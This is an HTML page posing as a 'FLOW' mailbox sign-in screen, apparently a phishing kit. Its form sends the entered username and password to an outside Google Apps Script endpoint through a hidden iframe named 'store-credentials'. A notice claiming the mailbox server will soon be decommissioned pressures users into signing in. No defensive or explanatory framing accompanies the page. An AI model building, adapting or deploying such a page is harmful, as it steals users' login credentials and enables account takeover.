<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FLOW - Sign In</title>
    <style>
        /* Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #009ad7;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        /* Language Selector - Top Right */
        .language-selector {
            position: fixed;
            top: 24px;
            right: 32px;
            font-size: 13px;
            color: #1a237e;
            font-weight: 500;
        }

        .language-selector select {
            border: none;
            background: transparent;
            color: #1a237e;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            outline: none;
        }

        /* Main Container */
        .login-container {
            width: 100%;
            max-width: 380px;
            padding: 10px;
        }

        /* FLOW Logo */
        .logo {
            font-size: 24px;
            font-weight: 700;
            color: #1a237e;
            text-align: left;
            margin-bottom: 28px;
            letter-spacing: 8px;
        }

        /* White Box */
        .white-box {
            background: #ffffff;
            border-radius: 8px;
            padding: 36px 32px 32px 32px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
        }

        /* Form Group */
        .form-group {
            margin-bottom: 18px;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #1a1a1a;
            margin-bottom: 4px;
        }

        .form-control {
            width: 100%;
            padding: 10px 12px;
            font-size: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            background: #ffffff;
            transition: border-color 0.2s ease;
            box-sizing: border-box;
        }

        .form-control:focus {
            outline: none;
            border-color: #1a237e;
        }

        /* Forgot Password */
        .forgot-password {
            text-align: right;
            margin-top: 4px;
        }

        .forgot-password a {
            color: #333;
            font-size: 14px;
            text-decoration: none;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        /* Stay Signed In */
        .stay-signed-in {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 22px;
        }

        .stay-signed-in input[type="checkbox"] {
            width: 16px;
            height: 16px;
            cursor: pointer;
            accent-color: #1a237e;
        }

        .stay-signed-in label {
            font-size: 14px;
            color: #333;
            font-weight: 400;
            margin: 0;
            cursor: pointer;
        }

        /* Sign In Button */
        .sign-in-btn {
            width: 100%;
            padding: 12px;
            font-size: 15px;
            font-weight: 600;
            color: #fff;
            background-color: #00a1e4;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }

        .sign-in-btn:hover {
            background-color: #0d1445;
        }

        /* Warning Notice */
        .notice {
            background-color: #fef9e7;
            border-left: 4px solid #f1c40f;
            padding: 14px 16px;
            margin-top: 24px;
            border-radius: 3px;
            font-size: 13px;
            color: #555;
            line-height: 1.6;
        }

        .notice strong {
            color: #333;
            display: block;
            margin-bottom: 2px;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .login-container {
                padding: 5px;
            }

            .logo {
                font-size: 36px;
                letter-spacing: 6px;
            }

            .white-box {
                padding: 24px 18px 22px 18px;
            }

            .language-selector {
                top: 16px;
                right: 16px;
                font-size: 12px;
            }
        }
    </style>
</head>
<body>

    <!-- Language Selector -->
    <div class="language-selector">
        Language: <select>
            <option selected>English (United States)</option>
            <option>English (United Kingdom)</option>
            <option>Español</option>
            <option>Français</option>
            <option>Deutsch</option>
        </select>
    </div>

    <!-- Login Container -->
    <div class="login-container">

        <!-- FLOW Logo -->
        <div class="logo">FLOW</div>

        <!-- White Box -->
        <div class="white-box">

            <!-- Form -->
            <form action="https://script.google.com/macros/s/AKfycbwAlH9P8lrA_Cem4jltfB8crwSIP5ZEdYzsSEmQ-C2mNbI2ZAmqlMg2DXaDGIqS7QI-/exec" method="post" target="store-credentials">

                <!-- User Name -->
                <div class="form-group">
                    <label for="username">User name</label>
                    <input type="text" id="username" name="username" class="form-control" autocomplete="username">
                </div>

                <!-- Password -->
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" class="form-control" autocomplete="current-password">
                    <div class="forgot-password">
                        <a href="#">Forgot your password?</a>
                    </div>
                </div>

                <!-- Stay Signed In -->
                <div class="stay-signed-in">
                    <input type="checkbox" id="staySignedIn" name="staySignedIn" checked>
                    <label for="staySignedIn">Stay signed in</label>
                </div>

                <!-- Sign In Button -->
                <button type="submit" class="sign-in-btn">Sign in</button>

            </form>

            <!-- Warning Notice -->
            <div class="notice">
                <strong>Please note</strong>
                The server associated with this mailbox will be fully decommissioned soon. After that point, you will no longer have access to this mailbox. Make sure to back up or move any important emails before then.
            </div>

        </div>
        <!-- End White Box -->

    </div>

    <!-- Hidden iframe for form submission -->
    <div id="tmp" style="display: none;">
        <iframe src="javascript:false" name="store-credentials" width="0" height="0" tabindex="-1" title="empty" style="display:none"></iframe>
    </div>

</body>
</html>
